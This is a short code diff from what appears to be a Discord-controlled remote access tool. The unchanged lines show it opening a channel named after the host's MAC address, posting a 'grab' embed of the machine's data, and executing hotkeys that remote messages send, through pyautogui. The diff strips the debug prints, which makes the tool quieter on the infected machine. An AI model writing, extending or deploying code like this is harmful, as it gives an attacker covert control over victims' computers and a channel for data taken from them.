@@ -223,7 +223,6 @@ async def on_ready():
     if channel:
         await channel.send(embed=grabembed)
     else:
-        print("Channel with name {} does not exist. Creating...".format(mac_address))
         channel = await guild.create_text_channel(mac_address)
         e = await channel.send(embed=grabembed)
         await e.pin()
@@ -398,10 +397,8 @@ async def on_message(message):
 
                 keys = [key1, key2, key3]
                 hotkey = "+".join(keys)
-                print(hotkey)
                 try:
                     pyautogui.hotkey(*keys)
-                    print(*keys)
                     await channel.send("Sent keystroke: " + str(keys))
                     await message.delete()
                 except Exception as e:
